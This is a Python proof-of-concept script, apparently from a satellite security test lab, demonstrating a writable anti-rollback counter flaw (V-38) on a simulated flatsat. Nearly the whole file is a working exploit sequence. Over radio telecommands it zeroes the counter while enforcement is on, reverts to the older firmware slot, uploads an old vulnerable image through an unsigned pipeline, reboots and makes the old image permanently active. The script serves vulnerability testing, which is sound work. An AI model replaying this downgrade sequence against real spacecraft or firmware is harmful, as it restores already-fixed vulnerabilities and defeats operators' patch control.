#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-38  Anti-rollback counter lives in flash BUT is writable by TC even
# when enforcement is on: attacker zeroes the counter, flips back to the
# old slot (or pushes an older image) and the old CVEs return.
# SPARTA: SC-0004 / SPR-215 inverted (rollback protection bypass)
def status(dev):
    return dev.find(dev.tc(0x1F, b"\x03", via="usb"), 0x1F)[0]

def main(dev, ev):
    st = status(dev)
    arwc0 = struct.unpack(">I", st.payload[6:10])[0]
    ev.log(f"ARWC={arwc0} enforce={st.u8(10)} sig_req={st.u8(11)} "
           f"active_slot={st.u8(2)}")
    check(arwc0 == 7, "counter starts at 7")
    dev.tc(0x1F, bytes([7, 1]), via="usb")           # enforcement ON
    r = dev.tc(0x1F, bytes([4]) + struct.pack(">I", 0), via="radio")
    check(dev.find(r, 0x1F), "counter write accepted over the radio")
    st = status(dev)
    arwc = struct.unpack(">I", st.payload[6:10])[0]
    ev.log(f"after attacker write: ARWC={arwc} (enforce bit={st.u8(10)})")
    check(arwc == 0, "counter zeroed WHILE enforcement enabled -> bypass")
    # roll back to slot A (older firmware) with the counter on the floor
    dev.tc(0x1F, bytes([5]), via="usb")              # revert
    st = status(dev)
    check(st.u8(2) == 0, "active slot back to A")
    # and re-install an OLD image through the same unsigned pipeline
    body = b"OLD-VULNERABLE-IMG"
    dev.tc(0x1F, bytes([0]) + struct.pack(">I", 0) + bytes([len(body)])
           + struct.pack(">H", fs.crc16_ccitt(body)) + body, via="radio")
    r = dev.find(dev.tc(0x1F, bytes([1]), via="radio"), 0x1F)[0]
    check(r.u8(2) == 1, "old image finalize accepted (no version floor)")
    dev.tc(0x02, b"", via="radio")                   # reboot into slot B
    st = status(dev)
    ev.log(f"booted_slot={st.u8(5)} pending={st.u8(3)} -> old image runs, "
           f"ARWC still {struct.unpack('>I', st.payload[6:10])[0]}")
    check(st.u8(5) == 1, "old image booted")
    dev.tc(0x1F, bytes([2]), via="usb")              # confirm
    st = status(dev)
    check(st.u8(2) == 1, "old (vulnerable) slot now ACTIVE permanently")
    ev.log("=> patch level is unenforceable: every fixed CVE comes back "
           "with one TC + one reboot")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-38 writable anti-rollback counter", main))
